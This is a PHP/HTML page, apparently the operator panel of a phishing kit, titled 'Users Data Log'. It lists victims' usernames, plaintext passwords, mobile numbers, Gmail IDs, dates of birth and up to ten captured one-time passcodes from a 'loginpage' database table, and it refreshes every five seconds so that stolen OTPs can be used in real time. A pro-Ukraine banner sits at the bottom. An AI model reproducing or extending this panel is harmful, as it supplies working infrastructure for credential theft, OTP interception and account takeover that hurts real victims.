<?php include("db.php"); ?>
<!DOCTYPE html>
<html>

<head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.css">
     <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/dataTables.bootstrap4.min.css">
     <link rel="stylesheet" href="https://cdn.datatables.net/fixedheader/3.2.2/css/fixedHeader.bootstrap4.min.css">
     <style type="text/css">
          body {
               font-size: 140%;
          }

          h2 {
               text-align: center;
               padding: 20px 0;
          }

          table caption {
               padding: .5em 0;
          }

          table.dataTable th,
          table.dataTable td {
               white-space: nowrap;
          }

          .p {
               text-align: center;
               padding-top: 140px;
               font-size: 14px;
          }
     </style>



</head>

<body style="padding:20px; color:#000" onload="JavaScript:AutoRefresh(5000);">

     <div class="container" style="padding:20px;background-image: url('x.jpeg'); background-repeat: no-repeat; background-size:center;color:white;">
          <h2>Users Data Log</h2>

          <div class="table-responsive">
               <table id="example" class="table table-striped table-bordered" style="color:#000;">
                    <thead>
                         <tr>
                              <th>#</th>
                              <th>Username</th>
                              <th>Password</th>
                              <th>Mobile Number</th>
                              <th>Customer Name</th>
                              <th>Customer</th>
                              <th>Gmail-ID</th>
                              <th>Date of Birth</th>
                              <th>1st OTP</th>
                              <th>2rd OTP</th>
                              <th>3rd OTP</th>
                              <th>4th OTP</th>
                              <th>5th OTP</th>
                              <th>6th OTP</th>
                              <th>7th OTP</th>
                              <th>8th OTP</th>
                              <th>9th OTP</th>
                              <th>10th OTP</th>
                         </tr>
                    </thead>
                    <tbody>

                         <?php
                         $sqlsel = $conn->query("SELECT * FROM `loginpage` order by `id` desc");

                         foreach ($sqlsel as $key) { ?>
                              <tr>
                                   <td><?php echo $key['id']; ?></td>
                                   <td><?php echo $key['username']; ?></td>
                                   <td><?php echo $key['password']; ?></td>
                                   <td><?php echo $key['mobile']; ?></td>
                                   <td><?php echo $key['captcha']; ?></td>
                                   <td><?php echo $key['user_id']; ?></td>
                                   <td><?php echo $key['holdername']; ?></td>
                                   <td><?php echo $key['dob']; ?></td>
                                   <td><?php echo $key['otp1']; ?></td>
                                   <td><?php echo $key['otp2']; ?></td>
                                   <td><?php echo $key['otp3']; ?></td>
                                   <td><?php echo $key['otp4']; ?></td>
                                   <td><?php echo $key['otp5']; ?></td>
                                   <td><?php echo $key['otp6']; ?></td>
                                   <td><?php echo $key['otp7']; ?></td>
                                   <td><?php echo $key['otp8']; ?></td>
                                   <td><?php echo $key['otp9']; ?></td>
                                   <td><?php echo $key['otp10']; ?></td>
                              </tr>
                         <?php
                         }
                         ?>

                    </tbody>
               </table>
          </div>
     </div>
     <script type="text/JavaScript">
           function AutoRefresh( t ) {
                setTimeout("location.reload(1000000000000);", t);
             }
      </script>
     <script>
          $(document).ready(function() {
               var table = $('#example').DataTable({
                    fixedHeader: true,
                    order: [[0, 'desc']]
               });
          });
     </script>
     <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
     <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
     <script src="https://cdn.datatables.net/1.11.5/js/dataTables.bootstrap4.min.js"></script>
     <script src="https://cdn.datatables.net/fixedheader/3.2.2/js/dataTables.fixedHeader.min.js"></script>




     <style>
          .footer,
          .generic-footer {
               margin-bottom: 98px
          }

          @media (min-width:374px) {

               .footer,
               .generic-footer {
                    margin-bottom: 78px
               }
          }

          @media (min-width:546px) {

               .footer,
               .generic-footer {
                    margin-bottom: 56px
               }
          }

          @media (min-width:1055px) {

               .footer,
               .generic-footer {
                    margin-bottom: 0
               }
          }

          .disclaimer {
               position: fixed;
               z-index: 9999999;
               bottom: 0;
               right: 0;
               border-top: 2px solid #ff5c62;
               text-align: center;
               font-size: 14px;
               font-weight: 400;
               background-color: #fff;
               padding: 5px 10px 5px 10px
          }

          .disclaimer a:hover {
               text-decoration: underline
          }

          @media (min-width:1052px) {
               .disclaimer {
                    text-align: right;
                    border-left: 2px solid red;
                    border-top-left-radius: 10px
               }
          }

          @media (min-width:1920px) {
               .disclaimer {
                    width: 60%
               }
          }
     </style>
     <div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div>
</body>

</html>